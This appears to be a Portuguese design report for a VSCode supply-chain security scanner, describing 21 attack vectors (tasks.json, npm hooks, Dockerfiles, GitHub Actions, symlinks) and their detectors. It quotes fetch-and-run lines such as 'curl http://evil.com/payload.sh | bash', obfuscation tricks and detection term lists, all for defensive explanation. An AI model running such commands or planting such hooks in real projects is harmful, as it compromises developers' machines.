# VSCode Security Scanner — Attack Vectors Report

**Version:** 3.2 | **Total vectors:** 21 | **Engine features:** 9

---

## Resumo Executivo

O VSCode Security Scanner é uma ferramenta modular de análise estática que detecta malware e configurações maliciosas em projetos clonados do GitHub, com foco em ataques de supply chain. O scanner analisa arquivos de configuração do VSCode (tasks, settings, launch, keybindings), hooks do ecossistema de desenvolvimento (npm, git, Docker, GitHub Actions, pre-commit, Cargo, Ruby, Makefile, Justfile), scripts de bootstrap, arquivos de build Python, registros de pacotes, symlinks, e scripts persistentes no diretório global `~/.vscode/`. A detecção combina busca textual com normalização de ofuscação (backslash escaping, inserção de aspas, subshell expansion, hex encoding), análise de entropia de Shannon, detecção de ofuscação JS (array.join, fromCharCode) e parsing opcional de AST via esprima. Todos os 21 vetores são cobertos por 21 funções analisadoras conectadas a um orquestrador central que respeita uma lista de exclusão de diretórios de dependências (`.venv`, `node_modules`, `site-packages`, etc.).

---

## Tabela Consolidada de Vetores (21 vetores)

| # | Vetor | Arquivo(s) Alvo | Função Analisadora | Severidade |
|---|-------|-----------------|-------------------|------------|
| 1 | VSCode tasks.json | `.vscode/tasks.json` | `analyze_vscode_tasks_json` | CRITICAL |
| 2 | VSCode settings.json | `.vscode/settings.json` | `analyze_vscode_settings_json` | HIGH |
| 3 | VSCode extensions.json | `.vscode/extensions.json` | `analyze_vscode_extensions_json` | MEDIUM |
| 4 | VSCode launch.json | `.vscode/launch.json` | `analyze_vscode_launch_json` | HIGH |
| 5 | VSCode keybindings.json | `.vscode/keybindings.json` | `analyze_vscode_keybindings` | HIGH |
| 6 | npm lifecycle hooks | `package.json` | `analyze_npm_package_json_lifecycle_scripts` | CRITICAL |
| 7 | npmrc / yarnrc registry | `.npmrc` / `.yarnrc.yml` | `analyze_npmrc_yarnrc` | HIGH |
| 8 | Devcontainer commands | `.devcontainer/devcontainer.json` | `analyze_devcontainer_auto_execution_commands` | CRITICAL |
| 9 | Dockerfile | `Dockerfile*` | `analyze_dockerfile` | CRITICAL |
| 10 | Docker Compose | `docker-compose*.yml` | `analyze_docker_compose` | HIGH |
| 11 | Git hooks | `.git/hooks/*` | `analyze_git_hook_script` | HIGH |
| 12 | GitHub Actions | `.github/workflows/*.{yml,yaml}` | `analyze_github_actions_workflow` | HIGH |
| 13 | Makefile | `Makefile` / `makefile` | `analyze_makefile` | HIGH |
| 14 | Justfile / Taskfile | `Justfile` / `Taskfile.yml` | `analyze_justfile` | HIGH |
| 15 | Cargo build.rs | `build.rs` / `Cargo.toml` | `analyze_cargo_build_rs` | HIGH |
| 16 | Python build files | `setup.py` / `setup.cfg` / `pyproject.toml` | `analyze_python_build_file` | MEDIUM |
| 17 | Pip config | `requirements.txt` / `pip.conf` / `Pipfile` | `analyze_pip_config` | HIGH |
| 18 | Pre-commit config | `.pre-commit-config.yaml` | `analyze_pre_commit_config` | HIGH |
| 19 | Gemfile / .gemspec | `Gemfile` / `*.gemspec` | `analyze_gemfile` | HIGH |
| 20 | Bootstrap scripts | `configure` / `install.sh` / `bootstrap.sh` | `analyze_bootstrap_scripts` | HIGH |
| 21 | Symlinks fora do projeto | `**/*` (symlinks) | `check_symlinks_outside_project` | HIGH |

---

## Funcionalidades Complementares do Motor

| # | Funcionalidade | Descrição | Função/Constante |
|---|---------------|-----------|-----------------|
| A | Normalização de ofuscação | `c\url` → `curl`, `w'g'et` → `wget`, `$(...)`, backticks, `\x68\x74\x74\x70` → `http` | `normalize_text()` |
| B | Entropia de Shannon | Flags scripts com entropia > 4.5 bits/char (configurável via `rules.toml`) | `calculate_shannon_entropy()`, `detect_high_entropy_content()` |
| C | JS join detection | Detecta `['b','a','s','h'].join('')` e `String.fromCharCode(...)` | `detect_js_join_obfuscation()` |
| D | AST parsing (esprima) | Parsing opcional de AST JS para chamadas perigosas (`exec`, `spawn`, `eval`) | `analyze_js_code_with_ast()` |
| E | Exclusão de diretórios | Ignora `.venv`, `node_modules`, `site-packages`, `__pycache__`, etc. | `path_is_inside_excluded_directory()`, `DIRECTORY_NAMES_TO_EXCLUDE_FROM_ALL_SCANS` |
| F | Regras externalizadas | `rules.toml` contém todos os termos, padrões e thresholds | `_load_rules()`, `rules.toml` |
| G | Export JSON | Serializa findings em JSON estruturado com timestamp e contagens | `export_findings_report_as_json()` |
| H | Modo CLI headless | Scan sem dependência de GUI, ideal para CI/CD | `cli.py` → `scan` subcommand |
| I | Skeleton loader | Placeholder animado durante scan na GUI | `SkeletonCard` (`gui/widgets.py`) |

---

## Descrição Detalhada de Cada Vetor

### 1. VSCode tasks.json
- **Arquivo:** `.vscode/tasks.json`
- **Como o ataque funciona:** O VSCode permite definir tasks que executam automaticamente quando uma pasta é aberta (`runOn: "folderOpen"`). Um atacante pode inserir uma task maliciosa que baixa e executa um payload sem interação do usuário.
- **Comportamento malicioso típico:** `curl http://evil.com/payload.sh | bash` como `command` em uma task com `runOptions.runOn = "folderOpen"`.
- **Detecção:** A função `analyze_vscode_tasks_json()` (linha 230) extrai os campos `command`, `args`, `type`, `script`, `shell` de cada task, converte para lowercase, e busca por termos suspeitos via `find_suspicious_terms_in_text()`. Se `runOn == "folderOpen"` E termos perigosos forem encontrados, a severidade é CRITICAL.
- **Severidade CRITICAL:** Execução automática + comandos perigosos = comprometimento imediato ao abrir o projeto. HIGH quando só a execução automática está presente (inspeção manual necessária). MEDIUM quando só os termos perigosos estão presentes (não automático).
- **Ofuscação:** A normalização em `normalize_text()` é aplicada antes da busca, detectando `c\url`, `w'g'et`, `$(curl)`, e `\x68\x74\x74\x70` em comandos ofuscados.

### 2. VSCode settings.json
- **Arquivo:** `.vscode/settings.json`
- **Como o ataque funciona:** O settings.json pode redirecionar o shell do terminal integrado, o caminho do interpretador Python, ou o binário do Git para executáveis controlados pelo atacante.
- **Detecção:** `analyze_vscode_settings_json()` (linha 254) verifica a presença de chaves como `terminal.integrated.shell.*`, `terminal.integrated.profiles.*`, `git.path`, `python.defaultInterpreterPath` na lista `DANGEROUS_VSCODE_SETTINGS_KEYS` (definida em `rules.toml`).
- **Severidade HIGH:** Qualquer redefinição dessas chaves é potencialmente perigosa.

### 3. VSCode extensions.json
- **Arquivo:** `.vscode/extensions.json`
- **Como o ataque funciona:** Um atacante pode recomendar extensões maliciosas no `extensions.json`. Quando o VSCode abre a pasta, ele sugere instalar essas extensões.
- **Detecção:** `analyze_vscode_extensions_json()` (linha 270) verifica se há recomendações na chave `recommendations`.
- **Severidade MEDIUM:** Apenas indica a presença de recomendações para inspeção manual.

### 4. VSCode launch.json
- **Arquivo:** `.vscode/launch.json`
- **Como o ataque funciona:** Configurações de debug podem definir um `runtimeExecutable` ou `preLaunchTask` que aponta para um binário ou script malicioso.
- **Detecção:** `analyze_vscode_launch_json()` (linha 286) analisa cada configuração, combina `runtimeExecutable` e `preLaunchTask`, e busca termos suspeitos.
- **Severidade HIGH:** Execução de binário ou task suspeita via debugger.

### 5. VSCode keybindings.json
- **Arquivo:** `.vscode/keybindings.json`
- **Como o ataque funciona:** Keybindings podem usar comandos como `workbench.action.terminal.sendSequence` para enviar texto arbitrário ao terminal, efetivamente executando comandos quando uma tecla é pressionada.
- **Detecção:** `analyze_vscode_keybindings()` (linha 784) parseia o JSONC, itera sobre os bindings, e verifica se `command` contém `terminal.sendSequence` ou `shellCommand`. Se sim, busca termos suspeitos nos `args.text`.
- **Severidade HIGH:** Comando perigoso nos args. MEDIUM: apenas o comando suspeito sem args perigosos.
- **Função:** `analyze_vscode_keybindings()`

### 6. npm lifecycle hooks
- **Arquivo:** `package.json`
- **Como o ataque funciona:** O npm executa hooks de lifecycle automaticamente durante `npm install`. Um atacante pode definir scripts em hooks como `postinstall` que executam comandos arbitrários.
- **Detecção:** `analyze_npm_package_json_lifecycle_scripts()` (linha 330) verifica os hooks listados em `NPM_AUTO_EXECUTION_LIFECYCLE_HOOKS` (`preinstall`, `install`, `postinstall`, `prepare`, `prepublish`, `prepublishOnly`). Busca termos suspeitos, ofuscação JS (`Array.join('')`, `String.fromCharCode`), AST analysis, e alta entropia.
- **Severidade CRITICAL:** Hook automático com comando perigoso. MEDIUM: alta entropia sem termos explícitos (possível ofuscação).
- **Ofuscação:** `detect_js_join_obfuscation()` detecta `['b','a','s','h'].join('')`. `analyze_js_code_with_ast()` (esprima opcional) parseia AST para detectar chamadas como `child_process.exec()`.

### 7. npmrc / yarnrc registry
- **Arquivo:** `.npmrc`, `.yarnrc.yml`
- **Como o ataque funciona:** Um atacante pode definir um registro de pacotes personalizado apontando para um servidor que serve versões maliciosas de pacotes legítimos (dependency confusion / typo-squatting).
- **Detecção:** `analyze_npmrc_yarnrc()` (linha 424) procura por `registry=http` ou `registry=https` e extrai a URL.
- **Severidade HIGH:** Registro personalizado pode servir pacotes maliciosos.

### 8. Devcontainer commands
- **Arquivo:** `.devcontainer/devcontainer.json`
- **Como o ataque funciona:** O devcontainer.json define comandos que executam automaticamente ao criar ou iniciar um container (`postCreateCommand`, `postStartCommand`, etc.). Um atacante pode inserir comandos maliciosos que executam no ambiente containerizado.
- **Detecção:** `analyze_devcontainer_auto_execution_commands()` (linha 376) verifica as chaves em `DEVCONTAINER_AUTO_EXECUTION_KEYS`.
- **Severidade CRITICAL:** Comandos perigosos em hooks de execução automática.

### 9. Dockerfile
- **Arquivo:** `Dockerfile*`
- **Como o ataque funciona:** O padrão `curl http://evil.com/payload.sh | bash` em um `RUN` é o vetor clássico de supply chain em imagens Docker. Um atacante também pode usar `ENV LD_PRELOAD` para injetar bibliotecas ou `ADD` com URLs para baixar artefatos não verificados.
- **Detecção:** `analyze_dockerfile()` (linha 475) analisa linha a linha: detecta `RUN curl | bash`, `ENV LD_PRELOAD`, `ADD` com URL, e `FROM` com endereço IP.
- **Severidade CRITICAL:** `curl | bash` (execução imediata). HIGH: `LD_PRELOAD` ou `ADD` com URL. MEDIUM: `FROM` com IP.
- **Vetor:** `analyze_dockerfile()`

### 10. Docker Compose
- **Arquivo:** `docker-compose*.yml`
- **Como o ataque funciona:** Um compose file malicioso pode definir `privileged: true` para escalonamento de privilégio, montar volumes sensíveis do host (`/root/.ssh`, `/var/run/docker.sock`), ou usar `network_mode: host` para acesso total à rede.
- **Detecção:** `analyze_docker_compose()` (linha 754) parseia o YAML e verifica cada serviço por `privileged: true`, `network_mode: host`, e volumes que montam caminhos sensíveis definidos em `SUSPICIOUS_DOCKER_VOLUME_PATHS`.
- **Severidade HIGH:** `privileged: true` ou volumes sensíveis. MEDIUM: `network_mode: host`.
- **Dependência:** PyYAML (`HAS_YAML`).

### 11. Git hooks
- **Arquivo:** `.git/hooks/*`
- **Como o ataque funciona:** Git hooks são scripts que executam automaticamente em eventos como `commit`, `push`, `checkout`. Um repositório clonado pode conter hooks maliciosos no diretório `.git/hooks/`.
- **Detecção:** `analyze_git_hook_script()` (linha 397) lê o conteúdo do hook e busca termos suspeitos. Se o conteúdo tiver alta entropia (> 4.5 bits/char, threshold configurável via `ENTROPY_THRESHOLD`), também é sinalizado como possível ofuscação.
- **Severidade HIGH:** Termos suspeitos detectados. MEDIUM: alta entropia sem termos explícitos.

### 12. GitHub Actions
- **Arquivo:** `.github/workflows/*.{yml,yaml}`
- **Como o ataque funciona:** Workflows do GitHub Actions podem conter steps com `run: curl http://evil.com | bash` (injeção de script) ou usar ações third-party com tags mutáveis (ex: `@v1` em vez de commit SHA), permitindo que o mantenedor da ação substitua o código após review.
- **Detecção:** `analyze_github_actions_workflow()` (linha 519) parseia YAML dos workflows, itera sobre jobs e steps, executa `_parse_gh_actions_step()` que verifica `run:` por pipes shell, `uses:` por ações third-party, e tags mutáveis (não-SHA).
- **Severidade HIGH:** Pipe shell ou ação third-party com tag mutável.
- **Dependência:** PyYAML (`HAS_YAML`), com fallback para regex textual.

### 13. Makefile
- **Arquivo:** `Makefile`, `makefile`
- **Como o ataque funciona:** Makefiles tradicionais têm recipes que executam shell commands. Um atacante pode inserir `curl | bash` em um target como `install` ou `build`.
- **Detecção:** `analyze_makefile()` (linha 588) analisa linha a linha, identifica targets por `target:` e recipes por linhas tabuladas, e busca pipes shell, `base64 -d`, e `LD_PRELOAD`.
- **Severidade HIGH:** Pipe, base64 decode, ou LD_PRELOAD em recipe. MEDIUM: `$(shell ...)` com termos perigosos.

### 14. Justfile / Taskfile
- **Arquivo:** `Justfile`, `justfile`, `Taskfile.yml`, `Taskfile.yaml`
- **Como o ataque funciona:** Task runners modernos (Just, Task) têm a mesma semântica de recipes que Makefiles.
- **Detecção:** `analyze_justfile()` (linha 858) busca pipes shell, base64 decode, e LD_PRELOAD em cada linha não-comentário.
- **Severidade HIGH:** Pipe shell, base64, ou LD_PRELOAD.

### 15. Cargo build.rs
- **Arquivo:** `build.rs`, `Cargo.toml`
- **Como o ataque funciona:** O Rust compila e executa `build.rs` durante `cargo build`. Um atacante pode colocar comandos arbitrários no build script. Além disso, dependências de fontes `git` ou `path` podem ser manipuladas para supply chain.
- **Detecção:** `analyze_cargo_build_rs()` (linha 676) analisa `build.rs` buscando termos suspeitos, e `Cargo.toml` (via `tomli.loads()`) procurando dependências com `git:` ou `path:`.
- **Severidade HIGH:** `build.rs` com comandos perigosos. MEDIUM: dependência de fonte git/path.

### 16. Python build files
- **Arquivo:** `setup.py`, `setup.cfg`, `pyproject.toml`
- **Como o ataque funciona:** Arquivos de build Python podem definir `cmdclass` ou hooks que executam código arbitrário durante `pip install`.
- **Detecção:** `analyze_python_build_file()` (linha 464) busca padrões como `cmdclass=`, `setuptools.setup(`, `[build-system]`, `requires=`.
- **Severidade MEDIUM:** Possível execução de código durante instalação.

### 17. Pip config poisoning
- **Arquivo:** `requirements.txt`, `pip.conf`, `Pipfile`
- **Como o ataque funciona:** Um atacante pode adicionar `--extra-index-url` em `requirements.txt` ou modificar `index-url` em `pip.conf` para redirecionar a instalação de pacotes para um servidor PyPI malicioso (dependency confusion).
- **Detecção:** `analyze_pip_config()` (linha 818) verifica:
  - `requirements.txt`: `--extra-index-url` apontando para URL
  - `pip.conf`: `index-url` personalizado
  - `Pipfile`: `source` URL não oficial (sem `pypi.org`)
- **Severidade HIGH:** Registro personalizado. MEDIUM: Pipfile source não oficial.

### 18. Pre-commit config
- **Arquivo:** `.pre-commit-config.yaml`
- **Como o ataque funciona:** Pre-commit hooks executam automaticamente em `git commit`. Um atacante pode definir hooks com `language: system` (execução arbitrária) ou `language: script` e hooks de repositórios não-oficiais.
- **Detecção:** `analyze_pre_commit_config()` (linha 722) parseia YAML e verifica cada hook por `language: system/script`, repositórios não-oficiais, `args:` com termos suspeitos, e `entry:` perigoso.
- **Severidade HIGH:** `language: system/script`. MEDIUM: repo não-oficial ou args suspeitos.
- **Dependência:** PyYAML (`HAS_YAML`), com fallback textual.

### 19. Gemfile / .gemspec
- **Arquivo:** `Gemfile`, `*.gemspec`
- **Como o ataque funciona:** O Gemfile do Ruby define fontes de gems e dependências. Um `source:` apontando para registro não-oficial ou uma gem com `git:` pode ser supply chain. `.gemspec` pode definir `spec.extensions` que executam código durante `gem install`.
- **Detecção:** `analyze_gemfile()` (linha 888) busca `source` com URL não-`rubygems.org`, gems com `git:`, e `.gemspec` com `spec.extensions` ou `spec.executables`.
- **Severidade HIGH:** Source não oficial. MEDIUM: gem de fonte git ou .gemspec com extensions.

### 20. Bootstrap scripts
- **Arquivo:** `configure`, `install.sh`, `bootstrap.sh`, `bootstrap` (raiz do projeto)
- **Como o ataque funciona:** Scripts de bootstrap clássicos na raiz do projeto podem conter comandos que baixam e executam payloads.
- **Detecção:** `analyze_bootstrap_scripts()` (linha 926) busca termos suspeitos via `find_suspicious_terms_in_text()`.
- **Severidade HIGH:** Se contém `curl`, `wget`, `bash`, `sh`. MEDIUM: outros termos suspeitos.
- **Nota:** Apenas verifica a raiz do projeto, não recursivamente (evita falsos positivos em dependências).

### 21. Symlinks fora do projeto
- **Arquivo:** `**/*` (qualquer symlink)
- **Como o ataque funciona:** Links simbólicos que apontam para fora do diretório do projeto podem ser usados para acessar ou modificar arquivos do sistema (ex: `/etc/passwd`, `/root/.ssh/authorized_keys`).
- **Detecção:** `check_symlinks_outside_project()` (linha 771) percorre recursivamente `root.rglob("*")` (respeitando `DIRECTORY_NAMES_TO_EXCLUDE_FROM_ALL_SCANS`), e para cada symlink, verifica se o alvo resolvido está fora da árvore do projeto.
- **Severidade HIGH:** Symlink apontando para fora do projeto.
- **Exclusão:** Pula symlinks em `.venv/`, `node_modules/`, etc. (são comportamento normal de virtualenvs).

---

## Varredura Global

### ~/.vscode/ — Scripts persistentes
- **Arquivo:** `~/.vscode/` (fora de `extensions/`)
- **Como o ataque funciona:** Malware pode persistir scripts na raiz do `~/.vscode/` ou em subpastas não-`extensions/`. Esses scripts executam toda vez que o VSCode é iniciado.
- **Detecção:** `scan_global_vscode_directory()` (linha 936) varre `~/.vscode/` recursivamente, ignorando a pasta `extensions/`, e sinaliza qualquer arquivo com extensões suspeitas (`.sh`, `.js`, `.py`, `.exe`, `.bat`, `.ps1`, `.rb`, `.pl`).
- **Severidade HIGH:** Script suspeito fora de `extensions/`.

---

## Arquitetura do Motor

### Orquestrador: `scan_project_directory()`
A função central (linha 837) coordena todas as 21 funções analisadoras:
1. Coleta os tipos de diretório excluídos via `collect_excluded_dir_types()`
2. Executa `glob()` para cada categoria de arquivo, filtrando com `_not_excluded()`
3. Itera sobre cada coleção e chama o analisador respectivo
4. Atualiza `progress_callback(ratio)` após cada iteração
5. Retorna todos os findings ordenados por severidade

### Fluxo de detecção
```
Arquivo → parse_jsonc_file() / yaml.safe_load() / tomli.loads() / texto simples
        → [campos relevantes] → .lower()
        → normalize_text() [backslash, aspas, $(), backticks, hex]
        → find_suspicious_terms_in_text() [termos + URLs]
        → text_contains_base64_decode_pipeline() [base64 -d | ...]
        → detect_js_join_obfuscation() [Array.join, fromCharCode]
        → analyze_js_code_with_ast() [esprima opcional]
        → detect_high_entropy_content() [Shannon > ENTROPY_THRESHOLD]
        → DetectionFinding(severity, file_path, description, evidence, terms)
```

### Constantes e Configuração (via `rules.toml`)
| Constante | Seção `rules.toml` | Uso |
|-----------|-------------------|-----|
| `SUSPICIOUS_EXECUTION_TERMS` | `[suspicious].execution_terms` | 20 termos de comandos perigosos |
| `SUSPICIOUS_URL_PATTERNS` | `[suspicious].url_patterns` | Padrões de URL suspeitas |
| `SUSPICIOUS_FILE_EXTENSIONS_IN_VSCODE_ROOT` | `[suspicious].file_extensions_in_vscode_root` | Extensões monitoradas em ~/.vscode/ |
| `NPM_AUTO_EXECUTION_LIFECYCLE_HOOKS` | `[npm].auto_execution_hooks` | Hooks npm que disparam automaticamente |
| `DEVCONTAINER_AUTO_EXECUTION_KEYS` | `[devcontainer].auto_execution_keys` | Chaves de execução automática em devcontainer |
| `DANGEROUS_VSCODE_SETTINGS_KEYS` | `[vscode].dangerous_settings_keys` | Chaves de settings.json que redirecionam executáveis |
| `ENTROPY_THRESHOLD` | `[detection].entropy_threshold` | Threshold de entropia (default: 4.5) |

### Exclusão de Diretórios (`DIRECTORY_NAMES_TO_EXCLUDE_FROM_ALL_SCANS`)
```python
{
    ".venv", "venv", "env", ".env",
    "node_modules", "site-packages",
    "__pycache__", ".tox", ".eggs",
    "dist", "build", ".mypy_cache", ".pytest_cache",
}
```
Aplicado em todas as 21 coleções `glob()` e no `rglob()` de symlinks.

---

## Modos de Uso

- **GUI:** `uv run python main.py` — Interface customtkinter com skeleton loaders, sidebar de resumo, export JSON
- **CLI:** `uv run python cli.py scan --path . --json report.json --no-global` — Headless, ideal para CI/CD
- **AST (opcional):** `uv sync --extra ast` — Habilita esprima para parsing de AST JavaScript
